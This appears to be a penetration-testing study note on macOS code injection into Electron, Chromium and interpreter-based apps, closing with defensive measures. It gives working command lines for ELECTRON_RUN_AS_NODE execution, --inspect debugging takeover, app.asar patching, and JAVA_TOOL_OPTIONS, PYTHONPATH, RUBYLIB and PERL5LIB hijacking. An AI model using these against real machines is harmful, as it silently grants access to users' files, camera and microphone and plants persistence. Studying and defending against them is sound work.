---
tags: [macos, privesc, injection, electron, pentesting, red-team]
difficulty: intermediate
module: "45 - macOS Privilege Escalation"
topic: "45.12 Electron, Chromium and Interpreted App Injection"
---

# Electron, Chromium and Interpreted App Injection

## Introduction
AMFI and library validation make injecting *native* code into hardened apps difficult (see [[07 - AMFI and Launch Constraints]]). But a large class of popular macOS apps run **interpreted or scripted code** — Electron (Node.js), Chromium, Java, Python, Ruby, Perl, and .NET apps. These execute logic that is **not** subject to Mach-O code-signing in the same way: you don't need to load a signed dylib, you just need to feed the interpreter your script. Because such apps frequently hold valuable **TCC permissions** (Slack/Teams/VS Code with Full Disk Access, browsers with camera/mic), injecting into them inherits those permissions without any prompt. This is one of the most practical macOS injection avenues today.

## Electron App Injection
Electron apps embed Node.js. Several knobs turn them into a code-execution host:

### Environment-variable injection
Electron honors Node/Chromium env vars unless the app explicitly disables them and uses a hardened runtime without the relevant entitlements:
```bash
# Run arbitrary JS at startup via inspector or preload
ELECTRON_RUN_AS_NODE=1 /Applications/Some.app/Contents/MacOS/Some -e 'require("child_process").exec("id>/tmp/p")'

# Force a remote debugging port, then drive it over the DevTools protocol
/Applications/Some.app/Contents/MacOS/Some --inspect=127.0.0.1:1337
# attach and evaluate JS in the app's context (its TCC perms apply)
```
`ELECTRON_RUN_AS_NODE=1` turns the signed Electron binary into a plain Node interpreter running **your** code while still being the trusted app on disk.

### Tampering app resources (`app.asar`)
Electron app logic lives in `Contents/Resources/app.asar` (or an `app/` folder). If writable (no library validation protects JS), patching it injects persistent code that runs with the app's identity/permissions:
```bash
npx asar extract app.asar out/ && echo 'require("child_process").exec("...")' >> out/main.js && npx asar pack out/ app.asar
```

```text
+---------------------------------------------------------------+
|        WHY THIS BEATS NATIVE INJECTION                        |
+---------------------------------------------------------------+
|  Native dylib injection -> blocked by library validation      |
|  Electron/JS injection  -> AMFI doesn't gate the JS payload;   |
|     ELECTRON_RUN_AS_NODE / --inspect / app.asar edit all run   |
|     YOUR code as the trusted, TCC-permissioned app            |
+---------------------------------------------------------------+
```

## Chromium / Browser
Beyond Electron, Chromium-based browsers expose `--remote-debugging-port`, `--load-extension`, and user-data-dir tricks. Launching the browser with a debugging port (if it isn't already running, or via a fresh profile) lets an attacker drive it via the DevTools protocol to read cookies/sessions and pivot through its permissions.

## Java, Python, Ruby, Perl, .NET Apps
The same principle: the **interpreter** is the trusted signed binary, but it executes external scripts/classpaths/modules that AMFI does not validate.
```bash
# Java: inject via agent / classpath / JAVA_TOOL_OPTIONS
JAVA_TOOL_OPTIONS='-javaagent:/tmp/evil.jar' /path/to/JavaApp

# Python app: hijack an importable module on its sys.path / PYTHONPATH
PYTHONPATH=/tmp/evil /path/to/PythonApp     # evil/<module the app imports>.py
# or drop a writable .pth / sitecustomize.py

# Ruby/Perl: RUBYLIB / PERL5LIB module hijack
RUBYLIB=/tmp/evil /path/to/RubyApp
PERL5LIB=/tmp/evil /path/to/PerlApp

# .NET: DYLD/managed-assembly resolution + writable assemblies
```
For each, the attack is **module/agent search-path hijacking**: place a malicious importable unit earlier on the search path, or set the interpreter's env var, so the trusted app loads your code.

## Why It Matters
- **Inherit TCC without prompts:** the target app already holds Full Disk Access / Accessibility / camera-mic; your injected code uses them silently (chains to [[04 - TCC Transparency Consent and Control]]).
- **Bypass AMFI/library validation:** scripted payloads aren't gated like signed dylibs (contrast [[10 - Dyld Hijacking and DYLD_INSERT_LIBRARIES]]).
- **Persistence:** patched `app.asar`/modules re-run every launch of a trusted app.

## Defensive Notes
- Electron: build with **`fuses`** disabling `ELECTRON_RUN_AS_NODE`, Node CLI inspect, and `runAsNode`; enable the hardened runtime *and* asar integrity; do not ship `allow-dyld-environment-variables` / `disable-library-validation`.
- Make app resources (`app.asar`, classpaths, module dirs) **non-writable** by the user and validate their integrity at startup.
- Strip interpreter env vars in privileged/TCC-permissioned apps; avoid granting broad TCC to chat/IDE apps.
- Monitor for `--inspect`/`--remote-debugging-port` flags and `ELECTRON_RUN_AS_NODE`/`JAVA_TOOL_OPTIONS`/`PYTHONPATH` on app launches.

## Related Notes
- [[10 - Dyld Hijacking and DYLD_INSERT_LIBRARIES]]
- [[07 - AMFI and Launch Constraints]]
- [[04 - TCC Transparency Consent and Control]]
- [[09 - Dangerous Entitlements]]
- [[13 - macOS Auto-Start Locations and Persistence]]
